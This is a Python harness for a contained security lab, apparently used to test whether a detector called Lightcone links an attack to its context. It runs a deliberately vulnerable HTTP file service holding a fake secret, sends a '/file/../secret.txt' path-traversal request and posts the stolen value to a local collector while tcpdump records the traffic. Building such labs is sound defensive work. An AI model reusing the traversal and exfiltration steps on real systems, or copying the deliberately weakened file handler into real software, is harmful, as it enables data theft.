#!/usr/bin/env python3
"""Run a real, contained unauthorized-read sequence against a fake-secret lab.

Only an isolated user/network namespace may run the controller. All addresses
are private to a disposable veth pair. Captures remain evaluation-only.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import signal
import socket
import subprocess
import threading
import time
from pathlib import Path


CLIENT_IP = "10.203.0.1"
SERVER_IP = "10.203.0.2"
WEB_PORT = 18080
COLLECT_PORT = 19090
FAKE_SECRET = b"LC_FAKE_SECRET_FOR_ISOLATED_TEST_ONLY"


def digest(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def run(*args: str) -> None:
    subprocess.run(args, check=True, stdout=subprocess.DEVNULL)


def read_request(connection: socket.socket) -> tuple[str, bytes]:
    packet = bytearray()
    while b"\r\n\r\n" not in packet:
        chunk = connection.recv(4096)
        if not chunk or len(packet) + len(chunk) > 8192:
            raise ValueError("bounded HTTP request incomplete")
        packet.extend(chunk)
    head, body = bytes(packet).split(b"\r\n\r\n", 1)
    lines = head.split(b"\r\n")
    length = 0
    for line in lines[1:]:
        if line.lower().startswith(b"content-length:"):
            length = int(line.split(b":", 1)[1].strip())
    if length > 1024:
        raise ValueError("bounded HTTP body exceeded")
    while len(body) < length:
        chunk = connection.recv(4096)
        if not chunk:
            raise ValueError("HTTP body truncated")
        body += chunk
    return lines[0].decode("ascii", "strict"), body[:length]


def response(connection: socket.socket, status: int, body: bytes) -> None:
    phrase = "OK" if status == 200 else "Not Found"
    connection.sendall(
        f"HTTP/1.0 {status} {phrase}\r\nContent-Length: {len(body)}\r\n\r\n".encode()
        + body
    )


def serve_web(listener: socket.socket, root: Path, results: dict) -> None:
    observations = []
    try:
        for _ in range(3):
            connection, _ = listener.accept()
            with connection:
                line, _ = read_request(connection)
                parts = line.split(" ")
                if len(parts) != 3 or parts[0] != "GET":
                    response(connection, 404, b"missing")
                    observations.append({"line": line, "status": 404})
                    continue
                path = parts[1]
                if not path.startswith("/file/"):
                    response(connection, 404, b"missing")
                    observations.append({"line": line, "status": 404})
                    continue
                # Intentionally vulnerable only in this disposable lab: user
                # input can escape the public directory. Never let this lab
                # read outside its own fake service root.
                candidate = root / "public" / path.removeprefix("/file/")
                if candidate.resolve().is_relative_to(root.resolve()) and candidate.is_file():
                    body = candidate.read_bytes()
                    response(connection, 200, body)
                    observations.append({"line": line, "status": 200, "body_sha256": digest(body)})
                else:
                    response(connection, 404, b"missing")
                    observations.append({"line": line, "status": 404})
    except Exception as error:
        results["web_error"] = repr(error)
    results["web"] = observations


def serve_collector(listener: socket.socket, results: dict) -> None:
    try:
        connection, _ = listener.accept()
        with connection:
            line, body = read_request(connection)
            results["collector"] = {
                "line": line,
                "received_fake_secret": body == FAKE_SECRET,
                "body_sha256": digest(body),
            }
            response(connection, 200, b"recorded")
    except Exception as error:
        results["collector_error"] = repr(error)


def server(out: Path) -> int:
    root = out / "service"
    web = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    collector = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    for listener, port in [(web, WEB_PORT), (collector, COLLECT_PORT)]:
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.settimeout(10)
        listener.bind((SERVER_IP, port))
        listener.listen(4)
    results: dict = {}
    threads = [
        threading.Thread(target=serve_web, args=(web, root, results), daemon=True),
        threading.Thread(target=serve_collector, args=(collector, results), daemon=True),
    ]
    for thread in threads:
        thread.start()
    print("READY", flush=True)
    for thread in threads:
        thread.join(timeout=12)
    web.close()
    collector.close()
    results["complete"] = (
        len(results.get("web", [])) == 3
        and results.get("collector", {}).get("received_fake_secret") is True
        and not any(thread.is_alive() for thread in threads)
    )
    (out / "service_result.json").write_text(json.dumps(results, indent=2) + "\n")
    return 0 if results["complete"] else 1


def http_request(port: int, payload: bytes) -> tuple[int, bytes]:
    with socket.create_connection((SERVER_IP, port), timeout=3) as connection:
        connection.settimeout(3)
        connection.sendall(payload)
        chunks = []
        while True:
            chunk = connection.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)
    head, body = b"".join(chunks).split(b"\r\n\r\n", 1)
    return int(head.split(b" ", 2)[1]), body


def stop_capture(capture: subprocess.Popen) -> str:
    if capture.poll() is None:
        try:
            capture.send_signal(signal.SIGINT)
        except PermissionError:
            run("aa-exec", "-p", "tcpdump", "--", "kill", "-INT", str(capture.pid))
    _, stderr = capture.communicate(timeout=5)
    if capture.returncode != 0:
        raise RuntimeError(f"capture failed: {stderr}")
    return stderr.strip()


def controller(out: Path) -> int:
    uid_map = Path("/proc/self/uid_map").read_text().split()
    if (
        os.geteuid() != 0
        or len(uid_map) != 3
        or uid_map[0] != "0"
        or uid_map[2] != "1"
        or sorted(name for _, name in socket.if_nameindex()) != ["lo"]
    ):
        raise RuntimeError("run controller only with unshare -Urn")
    if out.exists():
        raise FileExistsError(f"refusing to overwrite {out}")
    out.mkdir(parents=True)
    root = out / "service"
    (root / "public").mkdir(parents=True)
    (root / "public" / "hello.txt").write_bytes(b"public hello\n")
    (root / "secret.txt").write_bytes(FAKE_SECRET)

    plan = {
        "schema": 1,
        "status": "frozen_before_attack",
        "scope": "isolated veth lab; no external host or real secret",
        "harness_sha256": digest(Path(__file__).read_bytes()),
        "fake_secret_sha256": digest(FAKE_SECRET),
        "server_ip": SERVER_IP,
        "web_port": WEB_PORT,
        "collector_port": COLLECT_PORT,
        "steps": [
            "benign GET /file/hello.txt control",
            "direct GET /secret.txt denial control",
            "unauthorized GET /file/../secret.txt traversal",
            "POST retrieved fake secret to local collector",
        ],
        "expectation": "attack request, secret response, and local transfer will be visible as TCP payload; test whether Lightcone admits their causal context",
    }
    (out / "plan.json").write_text(json.dumps(plan, indent=2) + "\n")

    holder: subprocess.Popen | None = None
    service: subprocess.Popen | None = None
    capture: subprocess.Popen | None = None
    try:
        holder = subprocess.Popen(["unshare", "-n", "sleep", "60"])
        time.sleep(0.2)
        if holder.poll() is not None:
            raise RuntimeError("server network namespace exited")
        run("ip", "link", "add", "vethlc0", "type", "veth", "peer", "name", "vethlc1")
        run("ip", "link", "set", "vethlc1", "netns", str(holder.pid))
        run("ip", "addr", "add", f"{CLIENT_IP}/24", "dev", "vethlc0")
        run("ip", "link", "set", "vethlc0", "up")
        run("nsenter", "-t", str(holder.pid), "-n", "ip", "addr", "add", f"{SERVER_IP}/24", "dev", "vethlc1")
        run("nsenter", "-t", str(holder.pid), "-n", "ip", "link", "set", "lo", "up")
        run("nsenter", "-t", str(holder.pid), "-n", "ip", "link", "set", "vethlc1", "up")
        run("ethtool", "-K", "vethlc0", "tx", "off")
        run("nsenter", "-t", str(holder.pid), "-n", "ethtool", "-K", "vethlc1", "tx", "off")

        service = subprocess.Popen(
            ["nsenter", "-t", str(holder.pid), "-n", "--preserve-credentials",
             "python3", str(Path(__file__).resolve()), "--server", "--out", str(out.resolve())],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        if service.stdout is None or service.stdout.readline().strip() != "READY":
            raise RuntimeError(f"local service did not become ready: {service.communicate()[1]}")

        capture = subprocess.Popen(
            ["tcpdump", "-i", "vethlc0", "-U", "-s", "0", "-nn", "-Z", "root",
             "-w", str(out / "capture.pcap")],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE,
            text=True,
        )
        time.sleep(0.3)
        if capture.poll() is not None:
            raise RuntimeError(f"capture exited early: {capture.communicate()[1]}")

        benign = http_request(WEB_PORT, b"GET /file/hello.txt HTTP/1.0\r\nHost: lab\r\n\r\n")
        direct = http_request(WEB_PORT, b"GET /secret.txt HTTP/1.0\r\nHost: lab\r\n\r\n")
        traversal = http_request(WEB_PORT, b"GET /file/../secret.txt HTTP/1.0\r\nHost: lab\r\n\r\n")
        assert benign == (200, b"public hello\n")
        assert direct[0] == 404
        assert traversal == (200, FAKE_SECRET)
        post = (
            b"POST /collect HTTP/1.0\r\nHost: lab\r\nContent-Length: "
            + str(len(FAKE_SECRET)).encode() + b"\r\n\r\n" + FAKE_SECRET
        )
        collected = http_request(COLLECT_PORT, post)
        assert collected == (200, b"recorded")
        _, service_stderr = service.communicate(timeout=10)
        if service.returncode != 0:
            raise RuntimeError(f"local service failed: {service_stderr}")
        time.sleep(2.0)
        capture_stderr = stop_capture(capture)
        capture = None
        pcap = out / "capture.pcap"
        if not pcap.is_file() or pcap.stat().st_size <= 24:
            raise RuntimeError("capture has no frames")
        result = {
            "schema": 1,
            "status": "captured_attack_sequence",
            "plan_sha256": digest((out / "plan.json").read_bytes()),
            "pcap_sha256": digest(pcap.read_bytes()),
            "pcap_bytes": pcap.stat().st_size,
            "benign_status": benign[0],
            "direct_secret_status": direct[0],
            "traversal_status": traversal[0],
            "traversal_returned_fake_secret": traversal[1] == FAKE_SECRET,
            "collector_received_fake_secret": collected == (200, b"recorded"),
            "capture_stderr": capture_stderr,
            "service_result_sha256": digest((out / "service_result.json").read_bytes()),
        }
        (out / "capture.json").write_text(json.dumps(result, indent=2) + "\n")
        print(json.dumps(result, indent=2))
        return 0
    finally:
        try:
            if capture is not None:
                stop_capture(capture)
        finally:
            if service is not None and service.poll() is None:
                service.terminate()
                service.wait(timeout=3)
            if holder is not None and holder.poll() is None:
                holder.terminate()
                holder.wait(timeout=3)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--out", type=Path, required=True)
    parser.add_argument("--server", action="store_true")
    args = parser.parse_args()
    return server(args.out) if args.server else controller(args.out)


if __name__ == "__main__":
    raise SystemExit(main())
